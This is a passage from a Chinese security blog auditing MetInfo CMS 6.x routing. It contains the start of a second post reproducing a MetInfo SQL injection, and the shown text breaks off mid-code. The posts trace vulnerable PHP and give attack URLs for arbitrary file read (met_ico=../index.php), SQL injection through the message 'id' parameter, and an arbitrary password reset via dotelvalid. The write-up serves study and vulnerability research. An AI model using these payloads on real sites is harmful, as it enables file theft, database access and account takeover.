<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$M_MODULE=<span class="string">'admin'</span>;</span><br><span class="line"><span class="keyword">if</span>(@$_GET[<span class="string">'m'</span>])$M_MODULE=$_GET[<span class="string">'m'</span>];</span><br><span class="line"><span class="keyword">if</span>(@!$_GET[<span class="string">'n'</span>])$_GET[<span class="string">'n'</span>]=<span class="string">"index"</span>;</span><br><span class="line"><span class="keyword">if</span>(@!$_GET[<span class="string">'c'</span>])$_GET[<span class="string">'c'</span>]=<span class="string">"index"</span>;</span><br><span class="line"><span class="keyword">if</span>(@!$_GET[<span class="string">'a'</span>])$_GET[<span class="string">'a'</span>]=<span class="string">"doindex"</span>;</span><br><span class="line">@define(<span class="string">'M_NAME'</span>, $_GET[<span class="string">'n'</span>]);</span><br><span class="line">@define(<span class="string">'M_MODULE'</span>, $M_MODULE);</span><br><span class="line">@define(<span class="string">'M_CLASS'</span>, $_GET[<span class="string">'c'</span>]);</span><br><span class="line">@define(<span class="string">'M_ACTION'</span>, $_GET[<span class="string">'a'</span>]);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">'../app/system/entrance.php'</span>;</span><br></pre></td></tr></table></figure>
<p>我们可以看到这里的<strong>$_NAME</strong>,<strong>$_CLASS</strong>,<strong>$_ACTION</strong>,可以由用户输入决定。<br>然后我们分析../app/system/entrance.php(可以将payload代入理解,我是通读的这个文件的所有代码，然后这里里面一段比较重要的代码)<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(M_TYPE == <span class="string">'system'</span>)&#123;</span><br><span class="line">	<span class="keyword">if</span>(M_MODULE == <span class="string">'include'</span>)&#123;</span><br><span class="line">		define (<span class="string">'PATH_OWN_FILE'</span>, PATH_APP.M_TYPE.<span class="string">'/'</span>.M_MODULE.<span class="string">'/module/'</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		define (<span class="string">'PATH_OWN_FILE'</span>, PATH_APP.M_TYPE.<span class="string">'/'</span>. M_NAME.<span class="string">'/'</span>.M_MODULE.<span class="string">'/'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	define (<span class="string">'PATH_OWN_FILE'</span>, PATH_APP.M_TYPE.<span class="string">'/'</span>.M_NAME.<span class="string">'/'</span>.M_MODULE.<span class="string">'/'</span>);<span class="comment">//app/system/feedback/admin/</span></span><br><span class="line">	define (<span class="string">'PATH_APP_FILE'</span>, PATH_APP.M_TYPE.<span class="string">'/'</span>.M_NAME.<span class="string">'/'</span>);<span class="comment">//app/system/feedback/</span></span><br></pre></td></tr></table></figure></p>
<p>接着包含load.class.php，调用module()函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require_once</span> PATH_SYS_CLASS.<span class="string">'load.class.php'</span>;</span><br><span class="line">load::module()</span><br></pre></td></tr></table></figure></p>
<p>加载module()函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">module</span><span class="params">($path = <span class="string">''</span>, $modulename = <span class="string">''</span>, $action = <span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (!$path) &#123;</span><br><span class="line">		<span class="keyword">if</span> (!$path) $path = PATH_OWN_FILE;<span class="comment">//app/system/feedback/admin/</span></span><br><span class="line">		<span class="keyword">if</span> (!$modulename) $modulename = M_CLASS;<span class="comment">//feedback_admin</span></span><br><span class="line">		<span class="keyword">if</span> (!$action) $action = M_ACTION;<span class="comment">//doexport</span></span><br><span class="line">		<span class="keyword">if</span> (!$action) $action = <span class="string">'doindex'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">self</span>::_load_class($path, $modulename, $action);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>调用本类函数的_load_class()<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">_load_class</span><span class="params">($path, $classname, $action = <span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">		$classname=str_replace(<span class="string">'.class.php'</span>, <span class="string">''</span>, $classname);</span><br><span class="line">		$is_myclass = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">if</span>(!<span class="keyword">self</span>::$mclass[$classname])&#123;<span class="comment">//$myclass[$classname]此时为空</span></span><br><span class="line">			<span class="keyword">if</span>(file_exists($path.$classname.<span class="string">'.class.php'</span>))&#123;<span class="comment">//判断是否存在/app/sysytem/feedback/admin/feedback_admin.class.php</span></span><br><span class="line">				<span class="keyword">require_once</span> $path.$classname.<span class="string">'.class.php'</span>;<span class="comment">//包含/app/sysytem/feedback/admin/feedback_admin.class.php</span></span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="keyword">echo</span> str_replace(PATH_WEB, <span class="string">''</span>, $path).$classname.<span class="string">'.class.php is not exists'</span>;</span><br><span class="line">				<span class="keyword">exit</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			$myclass = <span class="string">"my_&#123;$classname&#125;"</span>;</span><br><span class="line">			<span class="keyword">if</span> (file_exists($path.<span class="string">'myclass/'</span>.$myclass.<span class="string">'.class.php'</span>)) &#123;</span><br><span class="line">				$is_myclass = <span class="number">1</span>;</span><br><span class="line">				<span class="keyword">require_once</span> $path.<span class="string">'myclass/'</span>.$myclass.<span class="string">'.class.php'</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> ($action) &#123;<span class="comment">//action=doexport</span></span><br><span class="line">			<span class="keyword">if</span> (!class_exists($classname))</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">die</span>($classname . <span class="string">' '</span> . $action . <span class="string">' class\'s file is not exists!!!'</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span>(<span class="keyword">self</span>::$mclass[$classname])&#123;</span><br><span class="line">				$newclass = <span class="keyword">self</span>::$mclass[$classname];</span><br><span class="line">			&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="keyword">if</span>($is_myclass)&#123;<span class="comment">//is_myclass=0</span></span><br><span class="line">					$newclass = <span class="keyword">new</span> $myclass;</span><br><span class="line">				&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">					$newclass = <span class="keyword">new</span> $classname;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">self</span>::$mclass[$classname] = $newclass;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> ($action!=<span class="string">'new'</span>) &#123;</span><br><span class="line">				<span class="keyword">if</span>(substr($action, <span class="number">0</span>, <span class="number">2</span>) != <span class="string">'do'</span>)&#123;</span><br><span class="line">					<span class="keyword">die</span>($action.<span class="string">' function no permission load!!!'</span>);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">if</span>(method_exists($newclass, $action))&#123;</span><br><span class="line">					call_user_func(<span class="keyword">array</span>($newclass, $action));</span><br><span class="line">				&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">					<span class="keyword">die</span>($action.<span class="string">' function is not exists!!!'</span>);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">return</span> $newclass;</span><br><span class="line">		&#125;</span><br><span class="line">				<span class="keyword">return</span>  <span class="keyword">true</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
<p>后半段代码判断$action是否可执行，<strong><code>_load_class()</code></strong>方法可以引用并实例化一个类，当$action为空的时候，只引用文件。<br>如果$action为new,则实例化该类，否则如果$action以do开头，则实例化该类，并且调用该函数<br>要想包含app/system/feedback/admin/feedback_admin.class.php文件，需要满足<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">M_NAME = $_GET[<span class="string">'n'</span>] = feedback;</span><br><span class="line">M_MODULE = $_GET[<span class="string">'m'</span>] = admin;</span><br><span class="line">M_CLASS = $_GET[<span class="string">'c'</span>] = feedback_admin;</span><br><span class="line">M_ACTION= $_GET[<span class="string">'a'</span>] = doexport<span class="comment">//需要调用某do方法</span></span><br></pre></td></tr></table></figure></p>
<p>至此，就调用了app/system/feedback/admin/feedback_admin.class.php::doexport()函数<br>也就是我们上文提到的:每一个index.php里面都包含了entrance.php，然后有定义需要调用的模块，类，方法。这是被写死了。这个cms的特色就在于此。定义了这些的常量，调用方法就会如下所言<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">path:/app/system/M_NAME/M_MODULE/M_CLASS.class.php     函数 M_ACTION</span><br></pre></td></tr></table></figure></p>
<h3 id="0x02-2-2-MetInfo6-0-0后台任意文件读取下载"><a href="#0x02-2-2-MetInfo6-0-0后台任意文件读取下载" class="headerlink" title="0x02.2.2 MetInfo6.0.0后台任意文件读取下载"></a>0x02.2.2 MetInfo6.0.0后台任意文件读取下载</h3><p>寻找一下漏洞的位置，根据提示是在webset模块，所以到webset.class.php<br>发现在函数doseteditor()发现了漏洞的位置<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doseteditor</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">global</span> $_M;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>($_M[<span class="string">'form'</span>][<span class="string">'met_ico'</span>] != <span class="string">'../favicon.ico'</span>)&#123;</span><br><span class="line">			copy($_M[<span class="string">'form'</span>][<span class="string">'met_ico'</span>], <span class="string">'../favicon.ico'</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		... ...</span><br><span class="line">		... ...</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure></p>
<p>我们会发现如果用户输入met_ico的值，就可以指定替换../favicon.ico的内容，试着构造payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?lang=cn&amp;n=webset&amp;c=webset&amp;a=doseteditor&amp;met_ico=../index.php</span><br></pre></td></tr></table></figure></p>
<p><img src="/2019/07/14/在审计中学到的路由利用/3.png" alt=""></p>
<h3 id="0x02-2-3-6-1-2版本中的一个sql注入"><a href="#0x02-2-3-6-1-2版本中的一个sql注入" class="headerlink" title="0x02.2.3 6.1.2版本中的一个sql注入"></a>0x02.2.3 6.1.2版本中的一个sql注入</h3><p>在线留言处的注入方式是其中一个入口，这次我们选择另外一个入口进行注入，然后关于那个注入点的原理，就不细谈了，之前的文章分析过。<br>我们这里想要聊一聊的是这个是通过admin/index.php这个入口路由至这个方法。<br>这次的漏洞在/app/system/message/web/message.class.php<br>所以调用要满足：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">M_NAME = $_GET[<span class="string">'n'</span>] = message;</span><br><span class="line"></span><br><span class="line">M_MODULE = $_GET[<span class="string">'m'</span>] = web;</span><br><span class="line"></span><br><span class="line">M_CLASS = $_GET[<span class="string">'c'</span>] = message;</span><br></pre></td></tr></table></figure></p>
<p>要想调用add()，必须实例化类并执行方法，但这里限定只能实例化并执行do开头的方法。这里找到了message.class.php中的domessage()，它调用了add()方法。<br><img src="/2019/07/14/在审计中学到的路由利用/4.png" alt=""><br>然后这里最终的payload为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin/index.php?m=web&amp;n=message&amp;c=message&amp;a=domessage&amp;action=add&amp;lang=cn&amp;para137=1&amp;para186=1@qq.com&amp;para138=1&amp;para139=1&amp;para140=1&amp;id=42 and 1=1</span><br></pre></td></tr></table></figure></p>
<p><img src="/2019/07/14/在审计中学到的路由利用/5.png" alt=""></p>
<h3 id="0x02-2-4-Metinfo6-0-0任意用户密码修改"><a href="#0x02-2-4-Metinfo6-0-0任意用户密码修改" class="headerlink" title="0x02.2.4 Metinfo6.0.0任意用户密码修改"></a>0x02.2.4 Metinfo6.0.0任意用户密码修改</h3><p>在忘记密码处由于username可控导致任意用户密码修改</p>
<p>漏洞文件：\MetInfo6.0.0\app\system\user\web\getpassword.class.php<br>漏洞函数：dotelvalid()<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">dotelvalid</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">global</span> $_M;</span><br><span class="line">		$session = load::sys_class(<span class="string">'session'</span>, <span class="string">'new'</span>);</span><br><span class="line">		<span class="keyword">if</span>($_M[<span class="string">'form'</span>][<span class="string">'code'</span>]!=$session-&gt;get(<span class="string">"phonecode"</span>))&#123;</span><br><span class="line">			okinfo($_M[<span class="string">'url'</span>][<span class="string">'getpassword'</span>], $_M[<span class="string">'word'</span>][<span class="string">'membercode'</span>]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(time()&gt;$session-&gt;get(<span class="string">"phonetime"</span>))&#123;</span><br><span class="line">			okinfo($_M[<span class="string">'url'</span>][<span class="string">'getpassword'</span>], $_M[<span class="string">'word'</span>][<span class="string">'codetimeout'</span>]);</span><br><span class="line">		&#125;</span><br><span class="line">		$session-&gt;del(<span class="string">'phonecode'</span>);</span><br><span class="line">		$session-&gt;del(<span class="string">'phonetime'</span>);</span><br><span class="line">		$user = <span class="keyword">$this</span>-&gt;userclass-&gt;get_user_by_tel($_M[<span class="string">'form'</span>][<span class="string">'username'</span>]);</span><br><span class="line">		<span class="keyword">if</span>($user)&#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;userclass-&gt;editor_uesr_password($user[<span class="string">'id'</span>],$_M[<span class="string">'form'</span>][<span class="string">'password'</span>]))&#123;</span><br><span class="line">				okinfo($_M[<span class="string">'url'</span>][<span class="string">'login'</span>], $_M[<span class="string">'word'</span>][<span class="string">'modifypasswordsuc'</span>]);</span><br><span class="line">			&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">				okinfo($_M[<span class="string">'url'</span>][<span class="string">'login'</span>], $_M[<span class="string">'word'</span>][<span class="string">'opfail'</span>]);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			okinfo($_M[<span class="string">'url'</span>][<span class="string">'login'</span>], $_M[<span class="string">'word'</span>][<span class="string">'NoidJS'</span>]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
<p>这里的phonecode是发给某手机的手机验证码，我们填入的验证码与此时页面发出的验证码的正确性以及验证码的时效性<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_M[<span class="string">'form'</span>][<span class="string">'code'</span>]!=$session-&gt;get(<span class="string">"phonecode"</span>))&#123;</span><br><span class="line">			okinfo($_M[<span class="string">'url'</span>][<span class="string">'getpassword'</span>], $_M[<span class="string">'word'</span>][<span class="string">'membercode'</span>]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(time()&gt;$session-&gt;get(<span class="string">"phonetime"</span>))&#123;</span><br><span class="line">			okinfo($_M[<span class="string">'url'</span>][<span class="string">'getpassword'</span>], $_M[<span class="string">'word'</span>][<span class="string">'codetimeout'</span>]);</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure></p>
<p>接着过了验证，修改某用户名的密码，这里未将用户名与验证码关联，导致我们可以给自己手机发验证码，然后填写其他人的用户名，强行修改密码<br>payload如下：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://../metinfo6.0.0/amdin/index.php?lang=cn&amp;n=user&amp;m=web&amp;c=password&amp;a=dotelvalid&amp;username=目标手机号&amp;password=密码&amp;code=接到的验证码</span><br></pre></td></tr></table></figure></p>
<h1 id="0x03-写在最后"><a href="#0x03-写在最后" class="headerlink" title="0x03 写在最后"></a>0x03 写在最后</h1><p>太菜了，对于cms的路由结构，以及整体的功能模块之间的联系，不够熟悉，代码编写能力有待提高，对于常见工具，比如phpstorm,sqlmap….的使用还不够熟练，太菜了</p>

          
        
      
    </div>

    

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/13/metinfo6-0-0-6-1-2sql注入-复现/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="cookie">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="The clown is laughing at you">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2019/07/13/metinfo6-0-0-6-1-2sql注入-复现/" class="post-title-link" itemprop="url">metinfo6.0.0-6.1.2sql注入[复现]</a>
              
            
          </h1>
        

        <div class="post-meta">

          
          
          

          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Veröffentlicht am</span>
              

              
                
              

              <time title="Erstellt: 2019-07-13 23:55:20" itemprop="dateCreated datePublished" datetime="2019-07-13T23:55:20+08:00">2019-07-13</time>
            </span>
          

          
            

            
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Bearbeitet am</span>
                
                <time title="Geändert am: 2019-07-14 15:23:24" itemprop="dateModified" datetime="2019-07-14T15:23:24+08:00">2019-07-14</time>
              </span>
            
          

          

          
            
            
          

          
          

          

          

          <br>
          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>ubuntu 19<br>php5.6+mysql<br>phpstorm+burpsuit</p>
<h2 id="写在前面-菜的明明白白"><a href="#写在前面-菜的明明白白" class="headerlink" title="写在前面,菜的明明白白"></a>写在前面,菜的明明白白</h2><p>复现这个漏洞，对cms的路由有了进一步的了解。意识到debug的重要性，函数之间的流转，使用debug能较好的了解。断点测试，能很好的了解参数的值，学长说代码问题都能够使用debug解决，所以学会熟练使用debug.然后编程能力有待提高，编写这次爆破的脚本很简单，但是我写的又慢，又烂……</p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=46687" target="_blank" rel="noopener">Metinfo 6.1.2 SQL注入</a><br><a href="https://blog.csdn.net/caiqiiqi/article/details/88716000" target="_blank" rel="noopener">MetInfo-6.1.2前台SQL注入</a><br><a href="https://mochazz.github.io/2018/11/09/Metinfo6.0.0-6.1.2%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E7%94%9F%E5%91%BD%E7%BA%BF/" target="_blank" rel="noopener">Metinfo6.0.0-6.1.2前台注入漏洞生命线</a></p>
<h1 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h1><p>对用户提交的数据没有进行严格的过滤，导致的sql注入</p>
<h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><p>这个漏洞，目前我所了解到的入口有3个<br>其一是利用admin/index.php文件调用带do方法触发sql漏洞<br>其二是利用message(在线留言)<br>其三是利用feedback(在线反馈)<br>漏洞点都是一样的，一点差别而已</p>
<p>先放一个POC，演示在线留言处触发漏洞<br><img src="/2019/07/13/metinfo6-0-0-6-1-2sql注入-复现/1.png" alt=""><br><img src="/2019/07/13/metinfo6-0-0-6-1-2sql注入-复现/2.png" alt=""><br>这里在id处存在bool盲注，并且时间盲注也是可以的。</p>
<h1 id="分析漏洞成因"><a href="#分析漏洞成因" class="headerlink" title="分析漏洞成因"></a>分析漏洞成因</h1><p>根据POC看到/message/index.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">define(<span class="string">'M_NAME'</span>, <span class="string">'message'</span>);</span><br><span class="line">define(<span class="string">'M_MODULE'</span>, <span class="string">'web'</span>);</span><br><span class="line">define(<span class="string">'M_CLASS'</span>, <span class="string">'message'</span>);</span><br><span class="line">define(<span class="string">'M_ACTION'</span>, <span class="string">'domessage'</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">'../app/system/entrance.php'</span>;</span><br></pre></td></tr></table></figure></p>
<p>这里定义了module为web,meessage类，调用方法domessage，个人感觉这些信息比较有用，在后续寻找路由的时候有很大的作用，当然这是我这个菜鸟的想法。</p>
<p>看到../app/system/entrance.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">load::module();</span><br></pre></td></tr></table></figure></p>
<p>跟踪../app/system/include/class/load.class.php::funtion module()<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="keyword">self</span>::_load_class($path, $modulename, $action);</span><br></pre></td></tr></table></figure></p>
<p>然后跟踪到../app/system/include/class/load.class.php::function load_class()<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(method_exists($newclass, $action))&#123;</span><br><span class="line">	 call_user_func(<span class="keyword">array</span>($newclass, $action));</span><br></pre></td></tr></table></figure></p>
<p>这一路下来，这个路由就很清楚了，然后根据之前index.php定义的值，看到message.class.php<br>看到函数domessage()<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">global</span> $_M;</span><br><span class="line"><span class="keyword">if</span>($_M[<span class="string">'form'</span>][<span class="string">'action'</span>] == <span class="string">'add'</span>)&#123;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;check_field();</span><br><span class="line">	<span class="keyword">$this</span>-&gt;add($_M[<span class="string">'form'</span>]);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>调用add()函数，跟踪看看函数体。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add</span><span class="params">($info)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">global</span> $_M;</span><br><span class="line">		<span class="keyword">if</span>(!$_M[form][id])&#123;</span><br><span class="line">           $message=DB::get_one(<span class="string">"select * from &#123;$_M[table][column]&#125; where module= 7 and lang ='&#123;$_M[form][lang]&#125;'"</span>);</span><br><span class="line">           $_M[form][id]=$message[id];</span><br><span class="line">		&#125;</span><br><span class="line">		$met_fd_ok=DB::get_one(<span class="string">"select * from &#123;$_M[table][config]&#125; where lang ='&#123;$_M[form][lang]&#125;' and  name= 'met_fd_ok' and columnid = &#123;$_M[form][id]&#125;"</span>);</span><br><span class="line">        $_M[config][met_fd_ok]= $met_fd_ok[value];</span><br><span class="line">		<span class="keyword">if</span>(!$_M[config][met_fd_ok])okinfo(<span class="string">'javascript:history.back();'</span>,<span class="string">"&#123;$_M[word][Feedback5]&#125;"</span>);<span class="comment">//反馈已关闭</span></span><br><span class="line">		<span class="keyword">if</span>($_M[config][met_memberlogin_code])&#123;</span><br><span class="line">			<span class="keyword">if</span>(!load::sys_class(<span class="string">'pin'</span>, <span class="string">'new'</span>)-&gt;check_pin($_M[<span class="string">'form'</span>][<span class="string">'code'</span>]))&#123;</span><br><span class="line"></span><br><span class="line">			 			okinfo(<span class="number">-1</span>, $_M[<span class="string">'word'</span>][<span class="string">'membercode'</span>]);<span class="comment">//验证码错误</span></span><br><span class="line">			&#125;</span><br><span class="line">	    &#125;</span><br></pre></td></tr></table></figure></p>
<p>关键代码在于<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$met_fd_ok=DB::get_one(<span class="string">"select * from &#123;$_M[table][config]&#125; where lang ='&#123;$_M[form][lang]&#125;' and  name= 'met_fd_ok' and columnid = &#123;$_M[form][id]&#125;"</span>);</span><br></pre></td></tr></table></figure></p>
<p>我们可以查看数据库验证一下<br><img src="/2019/07/13/metinfo6-0-0-6-1-2sql注入-复现/3.png" alt=""></p>
<p>所以问题就出在这儿，然后我们在看看过滤情况，我们回过头去看发现message类继承了web类，web类继承了common类<br>common类为一级基类，参考文章<a href="http://www.dengtar.com/2375.html" target="_blank" rel="noopener">metinfo-一级基类</a></p>
<p>common类中获取变量<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  * 获取GET,POST,COOKIE，存放在$_M['form']，系统表单提交变量数组</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">load_form</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">global</span> $_M;</span><br><span class="line">	$_M[<span class="string">'form'</span>] =<span class="keyword">array</span>();</span><br><span class="line">	<span class="keyword">isset</span>($_REQUEST[<span class="string">'GLOBALS'</span>]) &amp;&amp; <span class="keyword">exit</span>(<span class="string">'Access Error'</span>);</span><br><span class="line">	<span class="keyword">foreach</span>($_COOKIE <span class="keyword">as</span> $_key =&gt; $_value) &#123;</span><br><span class="line">		$_key&#123;<span 